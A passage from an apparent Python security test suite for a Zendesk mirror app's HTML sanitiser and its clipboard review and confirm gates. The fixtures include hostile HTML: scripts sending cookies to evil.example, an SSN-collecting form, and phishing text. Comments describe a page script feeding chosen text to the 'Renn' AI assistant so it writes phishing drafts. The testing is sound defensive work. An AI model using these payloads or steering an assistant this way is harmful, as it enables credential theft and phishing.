        "<style>body{background:url(https://evil.example/b)}</style>\n\n"
        '<p onclick="fetch(\'https://evil.example\')">Click</p>\n\n'
        '<img src="x" onerror="alert(1)">\n')
    res = tools._propose_article_update_impl(
        conn, title="Setting up SSO", body_markdown=body_md,
        rationale="update", article_id=101)
    assert res["ok"] is True and res["status"] == "pending"
    stored = zendesk_store.get_article_draft(conn, res["draft_id"])["body_html"]
    low = stored.lower()
    for banned in ("<script", "<form", "<object", "<meta", "<style",
                   "onclick", "onerror", "evil.example/x.js",
                   "evil.example/collect", "evil.example/b"):
        assert banned not in low, banned
    assert stored == sanitize_html(stored)          # fixed point
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    zendesk_store.set_draft_status(conn, "article", res["draft_id"], "ready")
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(res["draft_id"]))
    diff = seen["diffs"][-1]
    assert diff["change_count"] > 0 and diff["warning"] is None
    assert diff["markup_notice"] == ""              # nothing hidden left
    ctrl.js_copy_field("article_draft", str(res["draft_id"]), "body_html")
    assert calls[-1] == (stored, None)
    assert _source_added(diff).strip() == stored.strip()


def test_variant3_mirror_article_source_is_shown_before_any_copy(empty_db):
    """VARIANT 3 — mirror-article copy had no review gate AND a dishonest
    rendering: _article_srcdoc was sanitized while _resolve_copy returned
    the row's body_html byte-verbatim, and zendesk_import stored raw file
    bytes. Script/form tags were invisible in the only on-screen view and
    still landed on the clipboard.

    Now: import sanitizes at the write; a pull-origin row that still
    carries such bytes is shown verbatim as body_source with an explicit
    notice; and no mirror copy runs before that payload was served."""
    conn = empty_db.conn
    raw = ('<h2>Guide</h2><form action="https://evil.example/collect">'
           '<input name="ssn"></form><script>fetch("//evil")</script>')
    zendesk_store.upsert_articles(conn, [
        {"id": 501, "title": "Imported", "body_html": raw,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
        source_file="C:/tmp/evil.html")
    zendesk_store.upsert_articles(conn, [
        {"id": 502, "title": "Pulled", "body_html": raw,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    # no detail served yet → both copies refused (this is the missing gate)
    ctrl.js_copy_field("article", "501", "body_html")
    ctrl.js_copy_field("article", "502", "body_html")
    assert calls == []

    imported = zendesk_store.get_article(conn, 501)["body_html"]
    assert "<form" not in imported.lower() and "<script" not in imported.lower()
    _review_article(ctrl, 501)
    assert seen["article"][-1]["body_source"] == imported
    assert seen["article"][-1]["markup_notice"] == ""

    _review_article(ctrl, 502)
    detail = seen["article"][-1]
    assert detail["body_source"] == raw              # verbatim, and SHOWN
    assert "<form" not in detail["body_srcdoc"].lower()
    assert detail["markup_notice"]                   # honest about it
    ctrl.js_copy_field("article", "502", "body_html")
    assert calls[-1] == (raw, None)
    assert "preview does not display" in seen["status"][-1]


def test_variant4_duplicate_attributes_are_a_visible_change(empty_db):
    """VARIANT 4 — the projection kept only the FIRST occurrence of a
    duplicated attribute while sanitize emitted both, so a second href/src
    was reviewer-invisible. The source diff shows the raw markup, so the
    duplicate is right there; and whichever bytes the clipboard releases,
    they are hash-bound to that diff."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    evil = ('<p>Go to <a href="https://help.alma.test/ok" '
            'href="https://evil.example/steal">the portal</a>.</p>'
            '<img src="https://cdn.example/logo.png" '
            'src="https://evil.example/beacon.gif">')
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
                       body_html=evil)
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    added = _source_added(diff)
    assert "https://evil.example/steal" in added
    assert "https://evil.example/beacon.gif" in added
    assert diff["change_count"] > 0
    # the projection really does drop the second occurrence (why it lost)
    projected = zendesk_store.html_to_review_text(evil)
    assert "https://evil.example/steal" not in projected
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1] == (evil, None)


def test_variant5_a_computed_diff_is_not_a_read_diff(empty_db):
    """VARIANT 5 — the gate proved a diff was COMPUTED, not READ:
    js_request_diff is page-callable and recorded the review as a side
    effect, and js_mark_copied went pending → copied directly.

    That asymmetry is unchanged BY DESIGN (a page script cannot be forced to
    be a human), so what must hold is the property that keeps it harmless:
    the recorded review is bound to the EXACT BYTES, so the only thing a
    page script can self-authorize is bytes ALREADY IN THE ROW at the moment
    it asked for the diff. Pin that here.

    CORRECTION: the original reasoning went one step further and claimed
    "it can never widen the release". That is wrong whenever the page can
    influence what lands in the row — directly (js_save_draft's rename
    allowlist, js_save_body_edit) or indirectly (E2: driving Renn through
    the co-registered chat bridge). Round 4 tried to tell those apart by
    authorship and failed; the answer is the UNIVERSAL draft-copy confirm
    (see the draft-copy section below). This test's own coverage —
    self-authorized transitions and hash-bound release — is unchanged and
    still load-bearing."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    did = _ready_draft(conn, ctrl, title="T", body="x",
                       body_html="<p>reviewed</p>")
    ctrl.js_request_diff("article", str(did))
    served = _source_added(seen["diffs"][-1])
    assert "<p>reviewed</p>" in served

    # a hostile rewrite lands out of band, then the page replays the
    # transitions and the copy without re-requesting a diff
    zendesk_store.update_article_draft(
        conn, did, body_html='<p>reviewed</p><script>x()</script>')
    ctrl.js_mark_copied("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls == []
    assert "changed since you reviewed it" in seen["status"][-1]
    # and pending → copied still cannot skip the byte gate either
    did2 = zendesk_store.save_article_draft(
        conn, title="T2", body="x", article_id=101, rationale="r",
        body_html="<p>never reviewed</p>")
    _serve_revisions(ctrl)
    ctrl.js_mark_copied("article", str(did2))
    assert zendesk_store.get_article_draft(conn, did2)["status"] == "copied"
    ctrl.js_copy_field("article_draft", str(did2), "body_html")
    assert calls == []
    assert "has not been reviewed" in seen["status"][-1]


def test_variant6_script_and_style_content_is_in_the_reviewed_bytes(empty_db):
    """VARIANT 6 — <script>/<style> CONTENT is deliberately erased by the
    text projection (html_to_text/html_to_review_text skip those subtrees)
    yet was present in the copied bytes.

    A draft can still hold such bytes (the store deliberately does not
    rewrite draft rows — a version restore must reproduce mirror bytes
    exactly), so the invariant has to come from the review surface: the
    source diff carries the script body character for character, the
    markup notice fires, and the clipboard is hash-bound to it."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    evil = ('<p>Steps</p><script>fetch("https://evil.example/"+document.'
            'cookie)</script><style>p{background:url(https://evil.example/b)}'
            '</style>')
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
                       body_html=evil)
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    added = _source_added(diff)
    assert "fetch(" in added and "document.cookie" in added
    assert "url(https://evil.example/b)" in added
    assert diff["change_count"] > 0
    assert "preview does not display" in diff["markup_notice"]
    # the projection erases both bodies — that is exactly why it cannot be
    # the authority (regression anchor)
    projected = zendesk_store.html_to_review_text(evil)
    assert "document.cookie" not in projected
    assert "evil.example/b" not in projected
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1] == (evil, None)
    assert "preview does not display" in seen["status"][-1]
    # the rich mime flavour is still defanged, and is itself covered by the
    # review record (both flavours are hashed)
    ctrl.js_copy_field("article_draft", str(did), "body_rich")
    text, html = calls[-1]
    assert text == evil
    assert "fetch(" not in html and "evil.example/b" not in html
    assert seen["copies"][-1]["sanitized"] is True


def test_no_copy_can_release_bytes_the_review_never_showed(empty_db):
    """The invariant stated directly: for every copy target and field, the
    exact string handed to the clipboard hashes to something the recorded
    review contained. Assert it by construction — corrupt one recorded
    hash and the copy must fail closed."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    did = _ready_draft(conn, ctrl, title="T", body="x",
                       body_html="<p>body</p>")
    ctrl.js_request_diff("article", str(did))
    rec = ctrl._reviewed[("article_draft", did)]
    # every releasable payload was recorded, both flavours
    payloads, content_hash, _row = ctrl._copy_bundle(conn, "article_draft", did)
    assert content_hash == rec["content"]
    for p in payloads.values():
        assert zendesk_web._sha(p["text"]) in rec["bytes"]
        if p["html"] is not None:
            assert zendesk_web._sha(p["html"]) in rec["bytes"]
    # tamper: a review that no longer covers the bytes releases nothing
    ctrl._reviewed[("article_draft", did)] = {
        "content": content_hash, "bytes": frozenset({zendesk_web._sha("x")})}
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls == []
    assert "never showed" in seen["status"][-1]
    assert ("article_draft", did) not in ctrl._reviewed   # fails closed


def test_every_recorded_hash_is_shown_or_derived_from_shown_bytes(empty_db):
    """Closes the last gap in the invariant's wording.

    Of everything ``_record_review`` binds, the plain text flavours are
    rendered literally on the review surface (the diff rows / body_source /
    the title row). The rich (text/html mime) flavour is not independent
    content: it is ``sanitize_html`` of the string the reviewer WAS shown,
    and sanitize only removes and escapes — it can never introduce a tag,
    attribute or URL that was absent from the source. Assert that derivation
    (and the accompanying notice) so the claim is mechanically checked, not
    assumed.

    Note the RENDERED preview srcdoc is a third, WIDER rendering
    (sanitize_html_preview + Help Center CSS) and is deliberately NOT a
    clipboard flavour — pinned here so a future widening of the preview can
    never be mistaken for widening the clipboard."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    ctrl, seen = _controller(empty_db)
    _review_article(ctrl, 101)
    payloads, _h, _r = ctrl._copy_bundle(conn, "article", 101)
    detail = seen["article"][-1]
    assert payloads["body_html"]["text"] == detail["body_source"]
    # the rich flavour derives from the exact bytes the reviewer was shown
    assert payloads["body_rich"]["html"] == sanitize_html(detail["body_source"])
    # ...and it is NOT the preview srcdoc (which carries the Help Center CSS
    # and the wider preview profile)
    assert payloads["body_rich"]["html"] != detail["body_srcdoc"]
    assert "alma-hc-article" in detail["body_srcdoc"]

    for html in ("<h2>Clean</h2><p>Fine.</p>", HOSTILE_HTML,
                 '<p><span style="font-size: 0">hidden</span></p>'):
        did = _ready_draft(conn, ctrl, title="T", body="x", body_html=html)
        ctrl.js_request_diff("article", str(did))
        diff = seen["diffs"][-1]
        payloads, _h, _r = ctrl._copy_bundle(conn, "article_draft", did)
        shown = payloads["body_html"]["text"]
        rich = payloads["body_rich"]["html"]
        # the plain flavour is literally in the served source diff
        assert shown in _source_added(diff)
        # the rich flavour is sanitize_html OF that exact string, and
        # sanitizing again changes nothing (removal-only, idempotent)
        assert rich == sanitize_html(shown)
        assert sanitize_html(rich) == rich
        # and whenever they differ the reviewer is told, in the diff and
        # again on the status line at copy time
        if rich != shown:
            assert "preview does not display" in diff["markup_notice"]
        else:
            assert diff["markup_notice"] == ""


def test_zero_change_with_differing_bytes_is_surfaced_as_a_warning(empty_db):
    """Requirement D. A source diff that reports no changed line while the
    bytes differ is a DIFF BUG, never an innocent '0 changed lines'. It
    cannot happen for any of the six variants (asserted above); the one
    residual case is a trailing-newline-only delta, which splitlines cannot
    represent — so pin that it surfaces the warning instead."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 601, "title": "T", "body_html": "<p>a</p>\n",
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    ctrl, seen = _controller(empty_db)
    did = zendesk_store.save_article_draft(
        conn, title="T", body="x", article_id=601, rationale="r",
        body_html="<p>a</p>")
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    assert diff["change_count"] == 0
    assert diff["bytes_equal"] is False
    assert diff["warning"] == zendesk_web._ZERO_CHANGE_WARNING
    # and the honest zero: identical bytes report zero WITHOUT a warning
    zendesk_store.update_article_draft(conn, did, body_html="<p>a</p>\n")
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    assert diff["change_count"] == 0 and diff["bytes_equal"] is True
    assert diff["warning"] is None


def test_macro_source_diff_shows_exact_action_bytes(empty_db):
    """Macros get the same treatment: the authoritative surface is the
    canonical actions JSON, so markup inside a reply is visible and the
    copied reply is hash-bound to it."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    reply = ('<p>Hi</p><span style="font-size: 0">Wire the funds.</span>'
             '<script>x()</script>')
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    did = zendesk_store.save_macro_draft(
        conn, name="Refund apology", macro_id=201, rationale="r",
        actions=[{"field": "comment_value", "value": reply}])
    zendesk_store.set_draft_status(conn, "macro", did, "ready")
    _serve_revisions(ctrl)
    ctrl.js_request_diff("macro", str(did))
    diff = seen["diffs"][-1]
    added = _source_added(diff)
    assert "font-size: 0" in added and "Wire the funds." in added
    assert "<script>x()<\\/script>" in added or "<script>x()</script>" in added
    assert diff["change_count"] > 0 and diff["warning"] is None
    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
    assert calls[-1] == (reply, None)


# ── SEC-3: the controller's payloads vs what the SPA actually reads ──

WEB_SRC = REPO / "web" / "src" / "zendesk"


def _jsx_reads(files, var):
    """Top-level keys the JSX genuinely reads off `var` (`article.body_text`
    → 'body_text'). Not a parser — a deliberately dumb, greedy scan, so it
    over-reports rather than missing a read."""
    pattern = re.compile(r"(?<![\w.$])" + var + r"\.([A-Za-z_]\w*)")
    keys: set[str] = set()
    for name in files:
        keys |= set(pattern.findall(
            (WEB_SRC / name).read_text(encoding="utf-8")))
    return keys


def test_controller_payloads_cover_every_key_the_spa_reads(empty_db):
    """SEC-3 blind spot, closed. The JS contract test (zendesk.test.jsx)
    checks the DEMO FIXTURE's keys, so when the controller quietly stopped
    emitting article_detail.body_text and revision.body — both READ by
    ArticleEditor/RevisionCenter to seed the specialist edit textarea — CI
    stayed green while both body editors opened BLANK in the real app (and
    a save then replaced the whole body with only what was typed).

    Bind the CONTROLLER's emitted payloads to the JSX SOURCES instead, so a
    controller/page drift cannot hide behind a fixture again."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="SSO (rev)", body="## Draft body\nStep one.",
        article_id=101, rationale="r")
    zendesk_store.save_macro_draft(
        conn, name="Refund v2", macro_id=201, rationale="r",
        actions=[{"field": "comment_value", "value": "hi"}])
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_article("101")
    ctrl.js_open_macro("201")
    ctrl.js_request_revisions("all")
    ctrl.js_request_diff("article", str(did))

    surfaces = [
        ("article", ("ArticleEditor.jsx", "ZendeskApp.jsx"),
         [seen["article"][-1]]),
        ("macro", ("MacroEditor.jsx", "ZendeskApp.jsx"), [seen["macro"][-1]]),
        ("rev", ("RevisionCenter.jsx",), seen["revisions"][-1]["revisions"]),
        ("diff", ("RevisionDiff.jsx",), [seen["diffs"][-1]]),
    ]
    for var, files, payloads in surfaces:
        wanted = _jsx_reads(files, var)
        assert wanted, f"no {var}.* reads found — the scan broke, not the app"
        assert payloads, f"{var}: nothing emitted to compare against"
        for payload in payloads:
            missing = sorted(wanted - set(payload))
            assert not missing, (
                f"{var}: the SPA reads {missing} but the controller never "
                "emits them")

    # the two that actually shipped broken, named so the regression is
    # readable without re-deriving it from the scan
    detail = seen["article"][-1]
    assert "Log into the admin console." in detail["body_text"]
    assert "<h2" not in detail["body_text"]        # markdown seed, not HTML
    row = next(r for r in seen["revisions"][-1]["revisions"]
               if r["draft_id"] == did and r["kind"] == "article")
    assert row["body"] == "## Draft body\nStep one."


def test_revision_bodies_are_served_exactly_where_edits_are_accepted(empty_db):
    """The `body` seed rides the revisions feed, which carries up to 500
    rows of up-to-200k-char bodies — so it is served for exactly the drafts
    js_save_body_edit accepts (pending articles) and is empty elsewhere.
    Keyed off the same constant the save slot validates against."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    pending = zendesk_store.save_article_draft(
        conn, title="P", body="pending body", article_id=101, rationale="r")
    ready = zendesk_store.save_article_draft(
        conn, title="R", body="ready body", article_id=101, rationale="r")
    zendesk_store.set_draft_status(conn, "article", ready, "ready")
    mac = zendesk_store.save_macro_draft(
        conn, name="M", macro_id=201, rationale="r",
        actions=[{"field": "comment_value", "value": "reply"}])
    ctrl, seen = _controller(empty_db)
    ctrl.js_request_revisions("all")
    rows = {(r["kind"], r["draft_id"]): r
            for r in seen["revisions"][-1]["revisions"]}
    assert rows[("article", pending)]["body"] == "pending body"
    assert rows[("article", ready)]["body"] == ""      # not editable
    assert rows[("macro", mac)]["body"] == ""          # macros out of scope
    assert zendesk_web._EDITABLE_DRAFT_STATUS == "pending"
    # and a body edit is accepted for exactly the row that carries a seed
    ctrl.js_save_body_edit("draft", str(pending), json.dumps({"body": "x"}))
    assert zendesk_store.get_article_draft(conn, pending)["body"] == "x"
    ctrl.js_save_body_edit("draft", str(ready), json.dumps({"body": "x"}))
    assert zendesk_store.get_article_draft(conn, ready)["body"] == "ready body"


# ── SEC-4: a hostile macro reply is announced like a hostile article ─

def test_macro_reply_markup_is_announced_not_hidden(empty_db):
    """SEC-4: a pull-origin macro is byte-faithful to remote Zendesk, so a
    comment_value_html full of script/handler markup is copyable verbatim.
    Articles said so; macros said nothing at all."""
    conn = empty_db.conn
    hostile = ('<p>Hi</p><script>fetch("https://evil.example")</script>'
               '<img src=x onerror="alert(1)">')
    zendesk_store.upsert_macros(conn, [
        {"id": 301, "name": "Hostile reply", "active": True,
         "updated_at": "2026-07-01T00:00:00Z",
         "actions": [{"field": "comment_value_html", "value": hostile}]}])
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_macro(ctrl, 301)
    ctrl.js_copy_field("macro", "301", "macro_reply")
    assert calls[-1] == (hostile, None)                # still byte-verbatim
    assert seen["copies"][-1]["notice"] == zendesk_web._MACRO_MARKUP_NOTICE
    assert "active markup" in seen["status"][-1]       # unforgeable surface
    # the macro NAME is plain text and carries no notice
    ctrl.js_copy_field("macro", "301", "macro_name")
    assert seen["copies"][-1]["notice"] == ""


def test_macro_reply_plain_text_is_not_falsely_flagged(empty_db):
    """The other half: a reply is frequently PLAIN TEXT, where sanitize_html
    differs purely by entity-escaping. Escaping hides nothing, so an
    ampersand must not raise a security warning on every macro."""
    conn = empty_db.conn
    plain = "Billing & Claims: we settle in 3-5 days (that's < 1 week)."
    zendesk_store.upsert_macros(conn, [
        {"id": 302, "name": "Plain", "active": True,
         "updated_at": "2026-07-01T00:00:00Z",
         "actions": [{"field": "comment_value", "value": plain}]}])
    from src.data.html_sanitize import sanitize_html
    assert sanitize_html(plain) != plain               # escaping-only delta
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_macro(ctrl, 302)
    ctrl.js_copy_field("macro", "302", "macro_reply")
    assert calls[-1] == (plain, None)
    assert seen["copies"][-1]["notice"] == ""
    assert "WARNING" not in seen["status"][-1]


# ── THE UNIVERSAL DRAFT-COPY CONFIRM ─────────────────────────────────
#
# A draft is by definition content that is NOT yet in Zendesk and is about
# to be pasted into a public site by hand. The review record only proves "a
# diff payload was PRODUCED for these bytes" — js_request_diff is
# page-callable, so a renderer-less script mints it for free.
#
# Round 4 tried to gate only the bytes the PAGE authored, tracked in a
# provenance ledger. Two independent attackers broke it:
#
#   E1  js_save_draft's macro branch committed `name` and `description` in
#       TWO transactions and stamped provenance only after both. A lone
#       unpaired surrogate in `description` (json.loads accepts it, the
#       sqlite bind refuses it) made the second write raise AFTER the first
#       had committed, so the page's chosen name was in the DB with no
#       stamp -> zero confirms, clipboard, ordinary success status line.
#
#   E2  page.py co-registers the Renn chat bridge on the SAME QWebChannel
#       (extra_bridges={"almaBridge": ...}) and ChatBridge.send is a @Slot.
#       So a page script chooses the exact text Renn receives, Renn calls
#       propose_article_update, and the page-chosen title/body land in a
#       draft VERBATIM through a Python-side actor the controller never
#       observes. No stamp, no confirm, clipboard -- including a full
#       phishing body asking members to phone in an SSN.
#
# The model was wrong, not the implementation: "a Python-side actor wrote
# it" does NOT imply "the page did not choose it". Any Python actor whose
# INPUT the page controls is not a trustworthy authorship source, so
# authorship is unknowable here and the ledger is deleted.
#
# What replaces it is simpler AND stronger: EVERY clipboard release of
# DRAFT content -- article draft or macro draft, every field, both mime
# flavours -- takes a NATIVE confirm that DISPLAYS THE EXACT BYTES. It does
# not matter who authored them, because the human sees exactly what is
# going to the clipboard at the moment it goes. Fail closed: no confirm_fn,
# declined, or bytes that moved under the dialog => no clipboard write and
# no copy_resolved receipt.
#
# MIRROR rows (already live in Zendesk, unmodified) keep the round-3
# review-record gate plus the markup notice, unchanged.

PAGE_PHISH_TITLE = ("Action required: re-verify your provider credentials "
                    "at https://alma-health-verify.example/sso before Friday")

PHISH_BODY_MD = (
    "# Urgent: benefits verification\n\n"
    "Call 1-555-0142 and provide your SSN, member ID and card number to "
    "keep your coverage active.\n")


def _served_article_draft(conn, ctrl):
    """A Renn-shaped article draft, served to the controller."""
    did = zendesk_store.save_article_draft(
        conn, title="Setting up SSO", body="renn body", article_id=101,
        body_html="<p>renn body</p>", rationale="r")
    _serve_revisions(ctrl)
    return did


def test_draft_copy_without_a_confirm_fn_fails_closed(empty_db):
    """THE ROUND-4 EXPLOIT CHAIN, executed verbatim, with every emitted
    signal discarded (a renderer that displays nothing): the page authors
    the title through the rename allowlist, mints the review record with
    requestDiff, marks ready, and asks for the clipboard.

    No confirm_fn injected -> refused, and no copy_resolved receipt."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    did = _served_article_draft(conn, ctrl)
    ctrl.js_save_draft("article", str(did),
                       json.dumps({"title": PAGE_PHISH_TITLE}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "title")
    assert calls == [] and seen["copies"] == []
    assert "only be copied from the app window" in seen["status"][-1]
    # the DB write itself is allowed (renaming a draft is legitimate); it is
    # the CLIPBOARD that is gated
    assert zendesk_store.get_article_draft(conn, did)["title"] == PAGE_PHISH_TITLE


def test_draft_copy_confirm_shows_the_exact_bytes(empty_db):
    """Declining writes nothing and issues no receipt; approving copies —
    and either way the confirm was handed the EXACT bytes."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    answers = [False, True]
    ctrl, seen, confirms = _gated(
        empty_db, answer=lambda: answers.pop(0),
        clipboard_fn=_clipboard(calls))
    did = _served_article_draft(conn, ctrl)
    ctrl.js_save_draft("article", str(did),
                       json.dumps({"title": PAGE_PHISH_TITLE}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))

    ctrl.js_copy_field("article_draft", str(did), "title")     # declined
    assert len(confirms) == 1
    assert PAGE_PHISH_TITLE in _confirm_blob(confirms)         # bytes SHOWN
    assert calls == [] and seen["copies"] == []                # no receipt
    assert "Copy cancelled" in seen["status"][-1]

    ctrl.js_copy_field("article_draft", str(did), "title")     # approved
    assert len(confirms) == 2
    assert calls == [(PAGE_PHISH_TITLE, None)]
    assert seen["copies"][-1]["ok"] is True


def test_macro_draft_copy_needs_the_confirm_on_every_field(empty_db):
    """The macro half: name AND reply, both gated, regardless of which
    actor wrote which (the reply here is Renn's)."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=False,
                                  clipboard_fn=_clipboard(calls))
    did = zendesk_store.save_macro_draft(
        conn, name="Refund apology", macro_id=201, rationale="r",
        actions=[{"field": "comment_value", "value": "Hi there"}])
    _serve_revisions(ctrl)
    ctrl.js_save_draft("macro", str(did),
                       json.dumps({"name": PAGE_PHISH_TITLE}))
    ctrl.js_request_diff("macro", str(did))
    ctrl.js_mark_ready("macro", str(did))
    ctrl.js_copy_field("macro_draft", str(did), "macro_name")
    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
    assert calls == [] and seen["copies"] == []
    assert len(confirms) == 2                       # one per attempted field
    blob = _confirm_blob(confirms)
    assert PAGE_PHISH_TITLE in blob and "Hi there" in blob


def test_draft_body_copy_shows_both_clipboard_flavours(empty_db):
    """A full page-authored BODY, in the plain and the text/html mime
    flavour alike — both strings reach the dialog, because both reach the
    clipboard."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    evil = (f"# Notice\n\n[{PAGE_PHISH_TITLE}]"
            "(https://alma-health-verify.example/sso)")
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    did = _served_article_draft(conn, ctrl)
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": evil}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    for field in ("body_html", "body_rich"):
        ctrl.js_copy_field("article_draft", str(did), field)
    assert calls == [] and seen["copies"] == []        # fails closed

    # the same chain on a second draft, behind an approving native confirm
    calls2 = []
    ctrl2, seen2, confirms = _gated(empty_db, answer=True,
                                    clipboard_fn=_clipboard(calls2))
    did2 = zendesk_store.save_article_draft(
        conn, title="Setting up SSO", body="renn body", article_id=101,
        body_html="<p>renn body</p>", rationale="r")
    _serve_revisions(ctrl2)
    ctrl2.js_save_body_edit("draft", str(did2), json.dumps({"body": evil}))
    ctrl2.js_request_diff("article", str(did2))
    ctrl2.js_mark_ready("article", str(did2))
    ctrl2.js_copy_field("article_draft", str(did2), "body_html")
    ctrl2.js_copy_field("article_draft", str(did2), "body_rich")
    assert len(confirms) == 2                          # one per released field
    stored = zendesk_store.get_article_draft(conn, did2)["body_html"]
    blob = _confirm_blob(confirms)
    assert PAGE_PHISH_TITLE in blob and stored in blob
    assert calls2[0] == (stored, None)
    text, html = calls2[1]
    assert text == stored and html is not None
    assert html in blob          # BOTH clipboard flavours were displayed


def test_article_target_body_edit_draft_is_gated_on_every_field(empty_db):
    """js_save_body_edit(target_kind='article') CREATES the draft. Its body
    is page-written and its title came from the mirror row — under the old
    per-field provenance model only the body was gated. Both are draft
    content, so both are gated now."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=False,
                                  clipboard_fn=_clipboard(calls))
    ctrl.js_open_article("101")
    ctrl.js_save_body_edit("article", "101",
                           json.dumps({"body": PAGE_PHISH_TITLE}))
    did = seen["actions"][-1]["draft_id"]
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    ctrl.js_copy_field("article_draft", str(did), "title")
    assert calls == [] and seen["copies"] == []
    assert len(confirms) == 2
    blob = _confirm_blob(confirms)
    assert PAGE_PHISH_TITLE in blob and "Setting up SSO" in blob
    # the MIRROR article the draft targets is unaffected: no confirm there
    ctrl.js_copy_field("article", "101", "title")
    assert calls == [("Setting up SSO", None)]
    assert len(confirms) == 2


def test_mirror_copies_stay_confirm_free(empty_db):
    """The other half of the rule, and the reason it is not just "confirm
    everything": content ALREADY LIVE in Zendesk — pulled articles, imported
    articles, mirror macros — copies under the recorded review alone. The
    ergonomics of browsing the mirror must not pay for the draft gate."""
    conn = empty_db.conn
    _seed_mirror(conn)                                  # 101/201 = pull origin
    zendesk_store.upsert_articles(conn, [
        {"id": 701, "title": "Imported", "body_html": "<p>from a file</p>",
         "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
        source_file="C:/tmp/x.html")
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=False,   # any confirm = fail
                                  clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 101)                          # pull origin
    _review_article(ctrl, 701)                          # import origin
    _review_macro(ctrl, 201)
    ctrl.js_copy_field("article", "101", "body_html")
    ctrl.js_copy_field("article", "701", "body_html")
    ctrl.js_copy_field("article", "101", "body_rich")
    ctrl.js_copy_field("macro", "201", "macro_reply")
    ctrl.js_copy_field("macro", "201", "macro_name")
    assert confirms == []                               # no dialog anywhere
    assert [c[0] for c in calls] == [
        zendesk_store.get_article(conn, 101)["body_html"],
        zendesk_store.get_article(conn, 701)["body_html"],
        zendesk_store.get_article(conn, 101)["body_html"],
        "Hi there",
        "Refund apology"]


def test_e2_renn_written_draft_still_demands_a_confirm(empty_db):
    """E2, THE STRUCTURAL BREAK, as a regression.

    The page cannot call save_article_draft — but it CAN call
    almaBridge.send (the Renn chat bridge rides this very QWebChannel), so
    it chooses the exact text Renn receives, and Renn's propose tool writes
    those page-chosen bytes into a draft VERBATIM. Drive the draft in
    through that Python-side path here (tools._propose_article_update_impl
    is what the MCP surface calls), then run the rest of the chain: mint the
    review record with requestDiff, markReady, copyField.

    Under the round-4 provenance ledger this produced ZERO confirms and put
    a phishing body on the clipboard. Now the copy is refused, because
    "who authored it" is no longer a question the gate asks."""
    from src.data.chat_tools import zendesk_mirror_tools as tools
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))

    # --- the laundering step: page-chosen bytes, written by a Python actor
    res = tools._propose_article_update_impl(
        conn, title=PAGE_PHISH_TITLE, body_markdown=PHISH_BODY_MD,
        rationale="member outreach", article_id=101)
    did = res["draft_id"]
    stored = zendesk_store.get_article_draft(conn, did)
    assert stored["title"] == PAGE_PHISH_TITLE          # verbatim, as E2 found
    assert "SSN" in stored["body"]

    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
